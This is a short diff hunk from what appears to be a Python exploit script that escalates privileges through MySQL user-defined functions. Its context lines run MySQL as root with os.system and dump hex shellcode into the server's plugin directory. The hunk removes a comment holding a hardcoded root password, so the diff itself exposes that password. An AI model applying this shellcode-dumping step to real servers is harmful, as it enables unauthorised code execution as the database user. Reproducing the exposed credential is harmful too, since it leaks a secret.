@@ -87,7 +87,6 @@ udf_outfile = plugin_dir_ + udf_filename
 
 # alternative way:
 # set @outputpath := @@plugin_dir; set @outputpath := @@plugin_dir;
-#mysql --host=127.0.0.1 --port 13306 -u root --port 13306 -pBmDu9xUHKe3fZi3Z7RdMBeb
 print "Trying to create a udf library...";
 os.system('mysql --host=127.0.0.1 --port 13306 -u root -p\'' + password + '\' -e "select binary 0x' + shellcode + ' into dumpfile \'%s\' \G"' % udf_outfile)
 res = os.path.isfile(udf_outfile)
